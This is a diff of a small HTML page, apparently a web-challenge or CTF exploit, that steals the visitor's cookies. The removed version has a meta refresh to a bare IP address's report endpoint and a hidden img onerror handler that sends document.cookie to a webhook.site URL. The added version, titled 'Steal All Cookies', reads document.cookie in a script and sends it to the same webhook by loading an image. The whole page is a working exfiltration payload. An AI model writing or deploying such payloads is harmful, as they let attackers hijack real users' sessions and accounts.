@@ -1,14 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta http-equiv="refresh" content="0;url=http://167.71.200.118:7002/report">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steal All Cookies</title>
+    <script>
+        // Retrieve all cookies
+        var cookies = document.cookie;
+        
+        // Send all cookies to your webhook server
+        var img = new Image();
+        img.src = `https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2/steal?cookies=${encodeURIComponent(cookies)}`;
+    </script>
 </head>
 <body>
-    <!-- This will execute after the redirect to report.html -->
-    <img 
-        src="x" 
-        onerror="fetch('https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2?cookie=' + document.cookie)"
-        style="display:none"
-    >
+    <h1>Stealing All Cookies...</h1>
 </body>
 </html>
